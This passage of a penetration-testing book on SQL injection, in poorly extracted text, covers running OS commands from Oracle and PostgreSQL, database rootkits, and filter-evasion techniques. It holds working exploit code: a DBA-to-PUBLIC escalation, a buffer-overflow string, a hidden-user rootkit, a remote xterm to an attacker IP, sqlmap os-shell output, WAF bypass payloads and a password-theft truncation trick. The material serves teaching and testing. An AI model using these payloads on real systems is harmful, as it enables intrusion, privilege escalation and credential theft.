dbms_scheduler exec dbms_scheduler.create_job(job_name =>‘rds2009job’,program_name =>‘rds2009’,start_date => null,repeat_interval => null,end_date => null,enabled => true,auto_drop => true); pl/sql native pl/sql native in oracle 10g/11g is undocumented, but can be the most reliable way to run operating system commands in oracle 10g/11g because the commands are executed as user oracle. additionally there are no special requirements as there are with java and extproc variations. the only requirement for pl/sql native is the right to modify the spnc_commands text file on the database server. oracle will execute everything in this file if a procedure/function/packag e is created and pl/sql native is enabled. the following code grants dba privileges to public by using pl/sql native. the grant command is a straight forward insert into sysauth$ command which can normally only be executed as sys . in this example, we create a text file called e2.sql which is executed by sqlplus . this sqlplus command is started via pl/sql native: create or replace function f1 return number authid current_user as pragma autonomous_transaction; v_file utl_file.file_type; begin execute immediate q‘!create directory tx as ‘c: \\’!’; begin -- grant dba to public; dbms_advisor.create_file (‘insert into sys.sysauth$ values(1,4,0,null);‘||chr(13)||chr(10)||’ exit;’, ‘tx’, ‘e2.sql’); end; execute immediate q‘!drop directory tx !’; execute immediate q‘!create directory t as ‘c:\\ oracle\\ora101\\plsql’!’; utl_file.fremove(‘t’,‘spnc_commands’); v_file:= utl_file.fopen(‘t’,‘spnc_commands’, ‘w’); utl_file.put_line(v_file,‘sqlplus / as sysdba @c:\\ e2.sql’); utl_file.fclose(v_file); execute immediate q‘!drop directory t!’; execute immediate q‘!alter session set plsql_compiler_flags=‘native’!’; execute immediate q‘!alter system set plsql_native_library_dir=‘c: \\’!’; execute immediate q‘!create or replace procedure h1 as begin null; end;!’; commit; return 1; end; / oracle text oracle text can also allow the execution of operating system commands. by using a custom filter (user_filter_pref) it is possible to pass the content of a table to the custom filter. in the following example we are passing tcl code via a table to the custo m filter. there is one limitation in the usage of oracle text custom filters. only executables from the oracle_home/bin, e.g. oratclsh.exe can be executed. if this is a limitation you may be able to use the utl_file package to copy the appropriate executab le to the oracle_home/bin directory in order to execute it: create table t (id number(9) primary key, text varchar2(2000)); begin ctxsys.ctx_ddl.drop_preference(‘user_filter_pref’); end; / begin ctxsys.ctx_ddl.create_preference ( preference_name => ‘user_filter_pref’, object_name => ‘user_filter’ ); ctxsys.ctx_ddl.set_attribute (‘user_filter_pref’,‘command’,‘oratclsh.exe’); end; / begin insert into t values (1,‘ set f [open “c:/aht.txt” {rdwr creat}] puts $f “your system is not protected!” close $f set f [open [lindex $argv 0] {rdwr creat}] puts $f “success” close $f ’); end; / drop index user_filter_idx; create index user_filter_idx on t (text) indextype is ctxsys.context parameters (‘filter user_filter_pref’); select token_text from dr$user_filter_idx$i; alter system set events alter system set is an undocumented parameter (since oracle 10g) that allows you to specify the name of a custom debugger which will be executed during a debugging event, which would then need to be forced. for example: alter system set “_oradbg_pathname”=‘/tmp/debug.sh’; pl/sql native 9i since 9i rel. 2, oracle offers the possibility to convert pl/sql code into c code. to increase the flexibility, oracle allows you to change the name of t he make utility (e.g. to calc.exe or any other executable). for example: alter system set plsql_native_make_utility=‘cmd.exe /c echo owned > c:\\ rds.txt &’; alter session set plsql_compiler_flags=‘native’; create or replace procedure rds as begin null; end; / buffer overflows in 2004, cesar cerrudo published an exploit for a buffer overflow in the oracle functions numtoyminterval and numtodsinterval (see http://seclists.org/vulnwatch/2004/q1/0030.html ). by using the following exploit, it was possible to run operating system commands on the database server: select numtoyminterval (1,‘aaaaaaaaaabbbbbbbbbbccccccccccabcdefghijklmnopqr‘||chr(59)||chr(79)||chr(150)||chr(01) ||chr(141)||chr(68)||chr(36)||chr(18)|| chr(80)||chr(255)||chr(21)||chr(52)||chr(35)||chr(148)||chr(01)||chr(255)|| chr(37)||chr(172)||chr(33)||chr(148)||chr(01)||chr(32)||’echo are you sure? >c:\\unbreakable.txt’) from dual; custom application code in the oracle world, it is not uncom mon to use tables containing operating system commands. these commands will be executed by an external program connecting to the database. by updating such an entry in the database with the command of your choice, you can often take over systems. it’s alwa ys worth it to check all tables for columns containing operating system commands. for example: +----+------------------------------------ +--------------- + | id| command| description| +----+------------------------------------ +--------------- + | 1| sqlplus – s / as sysdba @report.sql| run a report| +----+------------------------------------ +--------------- + | 2| rm /tmp/∗ .tmp| daily cleanup| +----+------------------------------------ +--------------- + by replacing rm /tmp/ ∗.tmp with xterm –display 192.168.2.21, sooner or later a new xterm window with oracle privileges will appear on the attacker’s pc. executing code as sysdba an additional option for database users with sysdba privileges (e.g. sys) is to use oradebug (9i rel.2, 10g r2, 11g r1, 11g r2) to call a ny operating system command or dll/library. it is important to note that the spaces have to be replaced with tab characters in the commands below: sqlplus sys/pw@dbserver as sysdba sql> oradebug setmypid sql> oradebug call system “/bin/touch -f /home/oracle/rds.txt”function returned 0 postgresql one of the popular ways to execute operating system commands under postgresql is by calling a user -defined function (udf). in sql databases, a user -defined function provides a mechanism for extending the functionali ty of the database server by adding a function that can be evaluated in sql statements. the sql standard distinguishes between scalar and table functions. a scalar function returns only a single value (or null). like mysql it is possible to create a udf ba sed on the shared libraries present on the native operating system. bernardo damele in his talk at black hat europe 2009 demonstrated this technique and showed the problems with using udf to achieve operating system code execution under postgresql. the mai n problem is that as of postgresql version 8.2 all shared libraries must include a ‘magic block,’ that is required to be added at compile time. tip to include a magic block, the following needs to be present in one (and only one) of the module source files , after having included the header fmgr.h: # ifdef pg_module_magic pg_module_magic; # endif as the shared libraries present on the native operating system will not have the magic block declaration in them, we will have to upload our own shared libraries wi th this declaration. for postgresql, the udf can be placed in any location where the postgresql user has read/write access. typically this is /tmp under linux/unix systems and “c: \\windows \\temp” on the windows platform. the tool sqlmap has this functionalit y already built -in and an attacker can use the switch -os-shell to execute operating system commands. the following is the process by which sqlmap will let you execute os code and see the output of the command: • upload a custom shared library (lib_postgr esqludf_sys) in the temp folder. • create a function (sys_eval) using this shared library. • execute the function and read the output using either a union or blind sql injection technique. the following shows sqlmap in action against a postgresql database: root@bt:/tmp# /pentest/database/sqlmap/sqlmap.py - u http://10.10.10.114/test.php?id=1 -- osshell sqlmap/0.9 -dev - automatic sql injection and database takeover tool http://sqlmap.sourceforge.net [∗] starting at: 17:15:30 [17:15:30] [info] using ‘/pentest/database/sqlmap/output/10.10.10.114/session’ as session file [17:15:30] [info] testing connection to the target url [17:15:30] [info] testing if the url is stable, wait a few seconds [17:15:31] [info] url is stable [17:15:31] [info] testing if get parameter ‘id’ is dynamic [17:15:31] [info] confirming that get parameter ‘id’ is dynamic [17:15:31] [info] get parameter ‘id’ is dynamic [17:15:31] [info] (error based) heuristics shows that get parameter ‘id’ is injectable (possible dbms: postgresql) [17:15:31] [info] testing sql injection on get parameter ‘id’ with 0 parenthesis [17:15:31] [info] testing unescaped numeric (and) injection on get parameter ‘id’ [17:15:31] [info] confirming unescaped numeric (and) injection on get parameter ‘id’ [17:15:31] [info] get parameter ‘id’ is unescaped numeric (and) injectable with 0 parenthesis [17:15:31] [info] testing if user- agent parameter ‘user- agent’ is dynamic [17:15:31] [warning] user- agent parameter ‘user -agent’ is not dynamic [17:15:31] [info] testing for parenthesis on injectable parameter [17:15:31] [info] the injectable parameter requires 0 parenthesis [17:15:31] [info] testing postgresql [17:15:31] [info] confirming postgresql [17:15:31] [info] the back- end dbms is postgresql web server operating system: linux ubuntu 8.10 (intrepid ibex) web application technology: php 5.2.6, apache 2.2.9 back-end dbms: postgresql [17:15:31] [info] testing stacked queries sql injection on parameter ‘id’ [17:15:31] [info] detecting back- end dbms version from its banner [17:15:31] [info] retrieved: 8.3.8 [17:15:37] [info] the target url is affected by a stacked queries sql injection on parameter ‘id’ [17:15:37] [info] fingerprinting the back- end dbms operating system [17:15:37] [info] the back- end dbms operating system is linux [17:15:37] [info] testing if current user is dba [17:15:37] [info] retrieved: 1 [17:15:37] [info] checking if udf ‘sys_eval’ already exist [17:15:37] [info] retrieved: 0 [17:15:37] [info] checki ng if udf ‘sys_exec’ already exist [17:15:37] [info] retrieved: 0 [17:15:37] [info] creating udf ‘sys_eval’ from the binary udf file [17:15:37] [info] creating udf ‘sys_exec’ from the binary udf file [17:15:37] [info] going to use injected sys_eval and sys _exec user- defined functions for operating system command execution [17:15:37] [info] calling linux os shell. to quit type ‘x’ or ‘q’ and press enter os-shell> id do you want to retrieve the command standard output? [y/n/a] a [17:15:41] [info] retrieved: uid=118(postgres) gid=127(postgres) groups=123(sslcert),127(postgres) command standard output: ‘uid=118(postgres) gid=127(postgres) groups=123(sslcert),127(postgres)’ os-shell> whoami [17:15:51] [info] retrieved: postgres command standard output: ‘postgres’ consolidating access several opportunities present themselves to the enterprising analyst once a full compromise has been affected. in 2002, chris anley published his “three -byte patch” for sql server which would effectively disable authentication on the system by reversing the logic of the conditional jump code branch. although this certainly looks good on tv, i cannot imagine too many customers who would happily tolerate the greater level of exposure they would endure during the course of such testing. one of this book’s contributing authors, alexander kornbrust, along with ngs software’s david litchfield have published extensively on the existence and creation of database rootkits, which effectively subvert the security of the database much like a trad itional rootkit subverts the security of an operating system. these can be made that much more effective since file system rootkits have been known for about decades whereas database rootkits are a fairly new concept. the following sample code implements a n oracle rootkit by updating a row in a table: -- the following code must run as dba sql> grant dba to hidden identified by hidden_2009; -- create a user hidden with dba privileges sql> select sys.kupp$proc.disable_multiprocess from dual; -- this select statement is needed for newer version of oracle (10.2.0.5, 11.1.0.7, 11.2.0.x) to activate the identity change sql> exec sys.kupp$proc.change_user(‘sys’); -- become user sys -- change the users record in sys.user$ sql> update sys.user$ set tempts#=666 where name=‘hidden’; -- does not show the user hidden sql> select username from dba_users; -- but the connect works sql> connect hidden/hidden_2009 here is a quick explanation of why this works. to display the list of users , oracle uses the views all_users and dba_users . these views contain a join among three tables. by setting tempts# (or datats# or type# ) to a nonexistent value, you can remove the user from the result of the join and from the view: create or replace force view “sys”.“all_users” (“username”, “user_id”, “created”) as select u.name, u.user#, u.ctime from sys.user$ u, sys.ts$ dts, sys.ts$ tts where u.datats# = dts.ts# and u.tempts# = tts.ts# and u.type# = 1 you can find further information concerning oracle rootkits at the following web sites: • www.red -database- security.com/wp/db_rootkits_us.pdf • www.databasesecurity.com/oracle -backdoors.ppt in 2008, two contributing authors of this book, marco slaviero and haroon meer, showed that newer versions of sql server now have the native ability to expose simple object acces s protocol (soap) -based web services through http.sys, the same kernel component that manages internet information server (iis). this means that an attacker who has obtained the necessary privileges can create an http listener that is bound to an sql stored procedure. the collection of images in figure 6.27 walks through the attack. starting from the left, we note that /test returns a page on the web server. the query manager windows to the right create the endpoint3 endpoint on path /test. the next two frames show that the /test page has now been “virtually overwritten.” figure 6.27 creating soap endpoints within sql server the preceding example shows the strange architecture choice that allows the create endpoint command in sql to effectively overwrite the /test page on the web server. this happens by design, because sql s erver is given a higher priority with http.sys . although simply creating a denial of service (dos) condition is fun, the utility is substantially increased when you consider the possibility of linking the endpoint to a stored procedure that can accept post ed commands which are then evaluated on the server. fortunately, this is not needed, since sql server natively supports sqlbatch when creating soap endpoints. according to msdn ( http://msdn.microsoft.com/enus/library/ms345123.aspx ) (sarsfield and raghavan ): “when batches are enabled on an endpoint by using the t -sql command, another soap method, called “sqlbatch,” is implicitly exposed on the endpoint. the sqlbatch method allows you to execute t -sql statements via soap.” this means that faced with the simple injection point used in previous examples, we can issue our request to create the soap endpoint we need: username=‘ exec(‘create endpoint ep2 state=started as http (authentication = (integrated),path = ‘‘/sp’’,ports=(clear))for soap (batches=enabled)’)— this creates a soap endpoint on the victim server on /sp , allowing us to aim a soap request (with an embedded sql query) at the endpoint. figure 6.28 shows a tiny perl -based soap query tool that you can use to talk to t he newly created endpoint. figure 6.28 a perl -based soap query to the created endpoint summary this chapter demonstrated how sql injection attacks can be used to attack the host on which the database server is running. the ability to read and write files to the file system and the ability to execute operating system commands is built into most modern r dbmss today, and this by extension means that this functionality is available to most sql injection attackers. the ability to use a single vulnerability such as a discovered sql injection point as a beachhead to launch attacks at other hosts is one of thos e penetration testing techniques that separates the men from the boys. this chapter covered how simple primitives such as file reading, file writing, and command execution can be used within sql injection attacks against the most prominent application architectures. with these primitives under your belt, you can move on to chapter 7 , which covers advanced sql injection topics. solutions fast track accessing the file system • the following pertains to reading files from the file system using sql injection: in mysql, you can use the load data infile and load_file() commands to read arbitrary files from the host. in microsoft sql server, you can read files from the file system using bulk insert or ole automation. on newer s ystems (sql server 2005 and later), you can use a quirk in the create assembly methods to read files from the file system. in oracle, you can read files using oracle directory, oracle text, or the utl_file method. • the following pertains to writing files to the file system using sql injection: in mysql, you can write files to the file system by using the select into outfile and select into dumpfile commands. in microsoft sql server, you can use ole automation and simple redirection (through command execution) to create files on the target file system. you can use debug.exe and bcp from the command line to assist with creating binaries on the target. in oracle, you can accomplish file writing using utl_file, dbms_advisor, dbms_xslprocessor, dbms_xmldom, java, or operating system commands and standard redirection. executing operating system commands • in mysql and postgresql, you can execute operating system comm ands through sql by creating a user -defined function (udf), postgresql supports execution of stacked queries making this attack very likely. sqlmap is recommended for this attack. most web frameworks do not allow execution of stacked queries for mysql and hence the attack in mysql is not likely to work. the database user must be a sysadmin user to create a user defined function. in microsoft sql server, you can execute commands via stored procedures such as xp_cmdshell , via ole automation, or through the ne w clr integration features. the database user must have the sysadmin role to be able to execute os code. • in oracle, you can execute commands th rough extproc, java, dbms_scheduler, pl/sql, oracle text, or oradebug. even if the database user does not have adequate permissions to execute code, privilege escalation attacks can be carried out when the database has missing security patches. consolidating access • you can use database rootkits to ensure repeat access to compromised servers. • database rootkits c an vary in complexity, from adding functionality to the database server to simply adding users to the system who do not show up with regular detection. references 1. rathakrishnan, b., et al. using clr integration in sql server 2005. microsoft corporation. <http://msdn.microsoft.com/en -us/library/ms345136.aspx > accessed 12.02.09. 2. {}, & hardbeat. how we defaced www.apache.org . <http://www.dataloss.net/papers/how.defaced.apache.org.txt > accessed 12.02.09. 3. foller, a. custom xp_cmdshell, using shell object. motobit software. <http://www.motobit.com/tips/detpg_cmdshell/> accessed 06.02.09. 4. sarsfield, b., & raghavan, s. overview of native xml web services for microsoft sql server 2005. microsoft corporation. < http://msdn.microsoft.com/en -us/library/ms345123(sql.90).aspx > accessed 06.02.09. frequently asked questions q: are all database back ends equal when it comes to sql injection attacks? a: although conventional wisdom has always held that attacks are equally lethal across the different rdbmss, i feel that the ability to run chained or stacked queries (as supported by sql server) makes injection attacks against microsoft sql server a much easier target for potential attackers. q: are special permissions needed for reading and writing files to the host operating system or can this be done by anyone? a: this generally varies from system to system, but it is safe to assume that some sort of elevated credentials are generally required. q: so, why would i care whether i can read or write files? a: attackers have shown outstanding creativity over the years in translating the ability to read or write files on a compromised host to a full host compromise. the ability to read arbitrary files from the f ile system of a distant database server often provides a goldmine of stored connection strings that allow an attacker to aim at other hosts deeper in the company’s network. q: would not securing the database configuration solve these problems? a: hardening the database configuration goes a long way toward preventing such attacks. in theory, all sql injection attacks can be prevented with tight configuration and well -written code. in practice, however, this is far easier said than done. security is a difficu lt game because it pits human against human, and some humans choose to spend huge amounts of time figuring ways around secure configurations. chapter 7 advanced topics dafydd stuttard solutions in this chapter: • evading input filters • exploiting second- order sql injection • exploiting client- side sql injection • using hybrid attacks introduction in the chapters so far, we have examined various techniques for finding, confirming, and exploiting sql injection vulnerabilities in typical situations. sometimes, however, you will encounter more challenging cases where you will need to expand these techn iques to handle some unusual features of an application, or combine them with other exploits to deliver a successful attack. in this chapter, we’ll explore more advanced techniques which you can use to enhance your sql injection attacks, and to overcome obstacles that you may encounter. we’ll discuss methods for evading input validation filters, and look at various ways in which you can bypass defenses such as web application firewalls. i’ll introduce second- order sql injection, a subtler case of the vulner ability, which you can leverage in cases where the kinds of attacks described so far are blocked. we look at client -side sql injection vulnerabilities, which can arise with the new client -side database features introduced in html5. finally, we’ll discuss hybrid attacks, where you can combine sql injection exploits with other attack techniques to deliver a more complex attack and compromise even relatively well -defended applications. evading input filters web applications frequently employ input filters that are designed to defend against common attacks, including sql injection. these filters may exist within the application’s own code, in the form of custom input validation, or may be implemented outside t he application, in the form of web application firewalls (wafs) or intrusion prevention systems (ipss). in the context of sql injection attacks, the most interesting filters you are likely to encounter are those which attempt to block any input containing one or more of the following: • sql keywords, such as select , and , insert , and so on. • specific individual characters, such as quotation marks or hyphens. • whitespace. you may also encounter filters which, rather than blocking input containing the items in the preceding list, attempt to modify the input to make it safe, either by encoding or escaping problematic characters or by stripping the offending items from the input and processing what is left in the normal way. often, the application code that the se filters protect is vulnerable to sql injection, and to exploit the vulnerability you need to find a means of evading the filter to pass your malicious input to the vulnerable code. in the next few sections, we will examine some techniques that you can use to do just that. using case variation if a keyword -blocking filter is particularly naïve, you may be able to circumvent it by varying the case of the characters in your attack string, because the database handles sql keywords in a case -insensitive manne r. for example, if the following input is being blocked: ‘ union select password from tblusers where username=‘admin’-- you may be able to bypass the filter using the following alterative: ‘ union select password from tblusers where username=‘admin’-- usin g sql comments you can use inline comment sequences to create snippets of sql which are syntactically unusual but perfectly valid, and which bypass various kinds of input filters. you can circumvent various simple pattern- matching filters in this way. for example, a recent vulnerability in the phpshop application (see http://seclists.org/bugtraq/2008/feb/0013.html ) employed the following input filter in an attempt to prevent sql injection attack s: if (stristr($value,‘from ’) ||stristr($value,‘update ’) || stristr($value,‘where ’) || stristr($value,‘alter ’) || stristr($value,‘select ’) || stristr($value,‘shutdown ’) || stristr($value,‘create ’) || stristr($value,‘drop ’) || stristr($value,‘delete from ’) || stristr($value,‘script’) || stristr($value,‘<>’) || stristr($value,‘=’) || stristr($value,‘set ’))die(‘please provide a permitted value for ’.$key); note the space following each sql keyword that is being checked for. you can easily bypass this filter using inline comments to separate each keyword without the need for whitespace. for example: ‘/∗∗/union/∗∗/select/∗∗ /password/∗∗ /from/∗∗/tblusers/∗∗/where/∗∗ /username/∗∗ /like/∗∗/ ‘admin’-- (note that the equals character (=), w hich is also being filtered, has been replaced with the like keyword in this bypass attack, which in this instance achieves the same result.) of course, you can use this same technique to bypass filters which simply block any whitespace whatsoever. many developers wrongly believe that by restricting input to a single token they are preventing sql injection attacks, forgetting that inline comments enable an attacker to construct arbitrarily complex sql without using any spaces. in the case of mysql, you can even use inline comments within sql keywords, enabling many common keyword- blocking filters to be circumvented. for example, if you modified the defective phpshop filter to check for the keywords only and not for the additional whitespace, the following at tack will still work if the back -end database is mysql: ‘/∗∗/un/∗∗ /ion/∗∗/sel/∗∗ /ect/∗∗/password/∗∗/fr/∗∗ /om/∗∗/tblusers/∗∗/whe/∗∗ /re/∗∗/username/∗∗/li ke/∗∗/‘admin’-- using url encoding url encoding is a versatile technique that you can use to defeat many kinds of input filters. in its most basic form, this involves replacing problematic characters with their ascii code in hexadecimal form, preceded by the % character. for example, the ascii code for a single quotation mark is 0x27, so its url -encoded repre sentation is %27. a vulnerability discovered in 2007 in the php -nuke application (see http://secunia.com/advisories/24949/ ) employed a filter which blocked both whitespace and the inline comment sequence /∗, but failed to block the url -encoded representation of the comment sequence. in this situation, you can use an attack such as the following to bypass the filter: ‘%2f%2a∗ /union%2f%2a∗ /select%2f%2a∗ /password%2f%2a∗ /from%2f%2a∗ /tblusers%2f%2a∗ /where%2f%2a ∗/ username%2f%2a ∗/like%2f%2a∗ /‘admin’-- in other cases, this basic url -encoding attack does not work, but you can nevertheless circumvent the filter by double -url encoding the blocked characters. in the double -encoded attack, the % character in the origin al attack is itself url -encoded in the normal way (as %25) so that the double -url -encoded form of a single quotation mark is %2527. if you modify the preceding attack to use double -url encoding, it looks like this: ‘%252f%252a∗ /union%252f%252a∗ /select%252f%252a∗ /password%252f%252a∗ /from%252f%252a∗ /tblusers% 252f%252a∗ /where%252f%252a∗ /username%252f%252a∗ /like%252f%252a∗ /‘admin’-- double -url encoding sometimes works because web applications sometimes decode user input more than once, and apply their input fil ters before the final decoding step. in the preceding example, the steps involved are as follows: 1 the attacker supplies the input ‘%252f%252a ∗/union ... 2 the application url decodes the input as ‘%2f%2a ∗/ union ... 3 the application validates that the input does not contain / ∗ (which it doesn’t). 4 the application url decodes the input as ‘/ ∗∗/ union ... 5 the application processes the input within an sql query, and the attack is successful. a further variation on the url -encoding technique is to use unicode enc odings of blocked characters. as well as using the % character with a two -digit hexadecimal ascii code, url encoding can employ various unicode representations of characters. further, because of the complexity of the unicode specification, decoders often t olerate illegal encodings and decode them on a “closest fit” basis. if an application’s input validation checks for certain literal and unicode -encoded strings, it may be possible to submit illegal encodings of blocked characters, which will be accepted by the input filter but which will decode appropriately to deliver a successful attack. table 7.1 shows various standard and non- standard unicode encodings of characters that are often useful when performing sql injecti on attacks. using dynamic query execution many databases allow sql queries to be executed dynamically, by passing a string containing an sql query into a database function which executes the query. i f you have discovered a valid sql injection point, but find that the application’s input filters are blocking queries you want to inject, you may be able to use dynamic execution to circumvent the filters. dynamic query execution works differently on diffe rent databases. on microsoft sql server, you can use the exec function to execute a query in string form. for example: exec(‘select password from tblusers’) in oracle, you can use the execute immediate command to execute a query in string form. for example : declare pw varchar2(1000); beginexecute immediate ‘select password from tblusers’ into pw; dbms_output.put_line(pw); end; databases provide various means of manipulating strings, and the key to using dynamic execution to defeat input filters is to use th e string manipulation functions to convert input that is allowed by the filters into a string which contains your desired query. in the simplest case, you can use string concatenation to construct a string from smaller parts. different databases use differ ent syntax for string concatenation. for example, if the sql keyword select is blocked, you can construct it as follows: oracle: ‘sel’||‘ect’ ms-sql: ‘sel’+‘ect’ mysql: ‘sel’‘ect’ note that sql server uses a + character for concatenation, whereas mysql uses a space. if you are submitting these characters in an http request, you will need to url -encode them as %2b and %20, respectively. going further, you can construct individual characters using the char function ( chr in oracle) using their ascii character code. for example, to construct the select keyword on sql server, you can use: char(83)+char(69)+char(76)+char(69)+char(67)+char(84) note that you can construct strings in this way without using any quotation mark characters. if you have an sql injection e ntry point where quotation marks are blocked, you can use the char function to place strings (such as ‘admin’ ) into your exploits. other string manipulation functions may be useful as well. for example, oracle includes the functions reverse, translate, replace, and substr . another way to construct strings for dynamic execution on the sql server platform is to instantiate a string from a single hexadecimal number which represents the string’s ascii character codes. for example, the string: select password fr om tblusers can be constructed and dynamically executed as follows: declare @query varchar(100) select @query = 0x53454c4543542070617373776f72642046524f4d2074626c5573657273 exec(@query) the mass sql injection attacks against web applications that started in early 2008 employed this technique to reduce the chance of their exploit code being blocked by input filters in the applications being attacked. using null bytes often, the input filte rs which you need to bypass in order to exploit a sql injection vulnerability are implemented outside the application’s own code, in intrusion detection systems (idss) or wafs. for performance reasons, these components are typically written in native code languages, such as c++. in this situation, you can often use null byte attacks to circumvent input filters and smuggle your exploits into the back- end application. null byte attacks work due to the different ways that null bytes are handled in native and managed code. in native code, the length of a string is determined by the position of the first null byte from the start of the string —the null byte effectively terminates the string. in managed code, on the other hand, string objects comprise a character a rray (which may contain null bytes) and a separate record of the string’s length. this difference means that when the native filter processes your input, it may stop processing the input when it encounters a null byte, because this denotes the end of the s tring as far as the filter is concerned. if the input prior to the null byte is benign, the filter will not block the input. however, when the same input is processed by the application, in a managed code context, the full input following the null byte wil l be processed, allowing your exploit to be executed. to perform a null byte attack, you simply need to supply a url -encoded null byte (%00) prior to any characters that the filter is blocking. in the original example, you may be able to circumvent native input filters using an attack string such as the following: %00’ union select password from tblusers where username=‘admin’-- nesting stripped expressions some sanitizing filters strip certain characters or expressions from user input, and then process the remaining data in the usual way. if an expression that is being stripped contains two or more characters, and the filter is not applied recursively, you c an normally defeat the filter by nesting the banned expression inside itself. for example, if the sql keyword select is being stripped from your input, you can use the following input to defeat the filter: selselectect exploiting truncation sanitizing filters often perform several operations on user -supplied data, and occasionally one of the steps is to truncate the input to a maximum length, perhaps in an effort to prevent buffer overflow attacks, or accommodate data within database fields that have a pred efined maximum length. consider a login function which performs the following sql query, incorporating two items of user -supplied input: select uid from tblusers where username = ‘jlo’ and password = ‘r1mj06’ suppose the application employs a sanitizing fi lter, which performs the following steps: 1 doubles up quotation marks, replacing each instance of a single quote (‘) with two single quotes (”). 2 truncates each item to 16 characters. if you supply a typical sql injection attack vector such as: admin’-- the following query will be executed, and your attack will fail: select uid from tblusers where username = ‘admin’’--’ and password = ’’ note that the doubled- up quotes mean that your input fails to terminate the username string, and so the query actually checks for a user with the literal username you supplied. however, if you instead supply the username: aaaaaaaaaaaaaaa’ which contains 15 a’s and one quotation mark, the application first doubles up the quote, resulting in a 17 -character string, and then r emoves the additional quote by truncating to 16 characters. this enables you to smuggle an unescaped quotation mark into the query, thus interfering with its syntax: select uid from tblusers where username = ‘aaaaaaaaaaaaaaa’’and password = ’’ this initial attack results in an error, because you effectively have an unterminated string: each pair of quotes following the a’s represents an escaped quote, and there is no final quote to delimit the username string. however, because you have a second insertion point, in the password field, you can restore the syntactic validity of the query, and bypass the login, by also supplying the following password: or 1=1-- this causes the application to perform the following query: select uid from tblusers where username = ‘aaaaaaaaaaaaaaa’’ and password = ’or 1=1--’ when the database executes this query, it checks for table entries where the literal username is: aaaaaaaaaaaaaaa’ and password = which is presumably always false, or where 1 = 1, which is always tru e. hence, the query will return the uid of every user in the table, typically causing the application to log you in as the first user in the table. to log in as a specific user (e.g. with uid 0), you would supply a password such as the following: or uid=0- - notes from the underground... other truncation attacks truncation of user -supplied input in sql queries can lead to vulnerabilities even when pure sql injection is not possible. in microsoft sql server, parameterized queries must specify a maximum length f or each string parameter, and if longer input is assigned to the parameter it is truncated to this length. furthermore, sql server ignores trailing whitespace when comparing strings within a where clause. these features can lead to a range of problems in vulnerable applications. for example, suppose an application allows users who have forgotten their password to submit their e -mail address and receive their forgotten password via e -mail. if the application accepts overly long input which gets truncated wit hin the sql query, an attacker can submit the following input: victim@example.org [many spaces]; evil@attacker.org in the resultant query, this input will retrieve the passw ord for victim@example.org , because the trailing whitespace in the truncated input is ignored: select password from tblusers where e -mail = ‘victim@example.org ’ when the ap plication then sends the password to the originally supplied e -mail address, a copy is also sent to the attacker, enabling him to compromise the victim’s account. for further details of this and similar attacks, see the paper “buffer truncation abuse in .n et and microsoft sql server,” written by gary o’leary -steele and available at www.scoobygang.org/hiddenwarez/bta.pdf . bypassing custom filters web applications are extremely varied, and you are likely to encounter all kinds of weird and wonderful input filters in the wild. you frequently can bypass these filters with a little imagination. oracle application server provides a useful case study in poorly devised custom filters. this product provide s a web interface to database procedures, enabling developers to quickly deploy a web application based on functionality that is already implemented within a database. to prevent attackers from leveraging the server to access the powerful procedures that are built into the oracle database, the server implements an exclusion list, and blocks access to packages such as sys and owa. blacklist- based filters of this kind are, of course, notoriously susceptible to bypasses, and oracle’s exclusion list is no exception. in the early 2000s, david litchfield discovered a series of defects in the filter, each involving ways of representing bl ocked packages that appear benign to the front -end filter but are still processed as intended by the back -end database. for instance, whitespace can be placed before the package name: https://www.example.com/pls/dad/%0asys.package.procedure the y character in sys can be replaced with a url -encoded ÿ character: https://www.example.com/pls/dad/s%ffs.package.procedure the package name can be placed within quotation marks: https://www.example.com/pls/dad/“sys”.package.procedure a programming goto label can be placed before the package name: https://www.example.com/pls/dad/<<foo>>sys.package.procedure although these examples are specific to a particular product, they illustrate the kinds of issues that can arise with custom input f ilters, and the techniques that you need to try when attempting to circumvent them. using non -standard entry points sometimes you will encounter situations where application -wide defenses are in place (such as wafs) which implement effective input filters and prevent the usual means of exploiting vulnerable code. in this situation, you should look for non- standard entry points into the application, which may be vulnerable to sql injection and which the application- wide filters may have overlooked. many wafs inspect the values of every request parameter, but do not validate the parameter names. you can, of course, add arbitrary parameter names to any request. if the application incorporates arbitrary parameter names into dynamic sql queries, you may be able t o perform sql injection despite the presence of the filter. consider an application function which saves user preferences. the preferences page has a large number of input fields, which are submitted to a url such as the following: https://www.example.org/preferences.aspx?lang=en&region=uk&currency=gbp... requesting this url causes the application to make a number of sql queries of the form: update profile set lang=‘en’ where uid=2104 update profile set region=‘uk’ where uid=2104 update profile set currency=‘gbp’ where uid=2104 ... because the fields used for preferences change over time, the developers decided to take a shortcut and implemented the functionality as follows: ienumerator i = request.querystring.getenumerator(); while (i.movenext()) {string name = (string)i.current; string query = “update profile set ” + name + “=‘‘‘+ request.querystring[name].replace(“’”, “’’”) + ’’’ where uid=” + uid; ... } this code enumerates all of the parameters supplied in the querystring, and builds a sql query using each one. although quotation marks in parameter values are being escaped, in an attempt to block sql injection attacks, the parameter values are embedded d irectly into the query without any filtering. hence, the application is vulnerable, but only if you place your attack into a parameter name. a similar vulnerability can arise if the application contains a custom logging mechanism which saves to the databas e all requested urls, including the querystring. if the input filters validate parameter values but not parameter names, you can place payloads into a parameter name to exploit the vulnerability. another entry point which application- wide input filters typ ically overlook is the headers within http requests. application code can process http headers in arbitrary ways, and applications frequently process headers such as host, referer, and user -agent in applicationlevel logging mechanisms. if the values of re quest headers are incorporated into sql queries in an unsafe manner, you may be able to perform a sql injection by attacking these entry points. notes from the underground... injection via search query referers in addition to custom mechanisms for logging re quests, many applications perform traffic analysis functions, providing administrators with data regarding the navigational paths followed by users within the application, and the external sources from which users arrive at the application. this analysis u sually includes information about the search queries performed by users which led them to the application. to determine the terms used in these queries, applications check the referer header looking for the domain names of popular search engines, and then parse out the search term from the relevant parameter in the referer url. if these terms are incorporated into sql queries in an unsafe manner, you can perform sql injection by embedding your attack in the query parameter of a search url, and submitting th is within the referer header. for example: get /vuln.aspx http/1.1 host:www.example.org referer: http://www.google.com/search?hl=en&q=a’;+waitfor+ delay+‘0:0:30’-- this kind of attack vector is pretty obscure, and is likely to be missed by many penetration testers and automated scanners (except for burp scanner, which checks for this attack against every request scanned). exploiting second -order sql injection virtually every instance of sql injection discussed in this book so far may be classified as “first -order” sql injection. this is because the events involved all occur within a single http request and response, as follows: 1 the attacker submits some crafted input in an http request. 2 the application processes the input, causing the attacker’s injected sql query to execute. 3 if applicable, the results of the query are returned to the attacker in the application’s response to the request. a diffe rent type of sql injection attack is “second -order” sql injection. here, the sequence of events is typically as follows: 1 the attacker submits some crafted input in an http request. 2 the application stores that input for future use (usually in the database), 